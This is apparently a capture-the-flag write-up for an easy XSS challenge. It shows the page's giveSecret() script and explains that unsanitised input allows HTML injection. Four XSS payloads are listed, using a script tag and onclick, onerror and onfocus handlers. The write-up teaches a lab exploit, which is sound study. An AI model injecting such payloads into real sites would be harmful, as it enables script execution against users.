## Intoduction

A straight-forward easy XSS challenge


## Investigation

If you investigate the HTML source code you'll eventually find the following script tag

```html

    <script>
        window.__nonce = "{{ nonce }}";
        
          const giveSecret = async () => {
            await fetch("/activate-flag", {
                method: "POST",
                headers : {
                    "X-Nonce" : window.__nonce,
                    "Content-Type": "application/json"
                },
                body : JSON.stringify({ message: "{{ message }}" }),
                credentials: "include" 
            })
            
            location.href = "/flag"
            
        }
    </script>

```

So the `giveSecret()` function activates the flag page to give us the flag so you need to trigger it otherwise the flag page won't show you the real flag.

Triggering the function using the console of the browser won't work because the CTF-challenge requires you to exploit XSS vulnerability and a valid payload.


## Vulnerability

Intuitively you would be testing the input by inserting some html tags and evetually you'll find that they ain't sanatized and therefore => *XSS*

## Exploit and Payloads

So to exploit this vulnerability we are going to insert an html tag with an event that triggers the function `giveSecret()` to get our flag.

Using any html tag + event trigger is correct.

So examples for payload are:

```html
<script>giveSecret()</script>
<h1 onclick="giveSecret()">Click Me</h1>
<img src=x onerror="giveSecret()" />
<input type="text" autofocus onfocus="giveSecret()">
```

And much more the CTF challenge is free and accepts many payloads as long as you understand the vulnerability you are free to craft what payload you want.


## Summary

1. Create custom HTML Tag + an event that triggers the giveSecret function
2. Trigger that event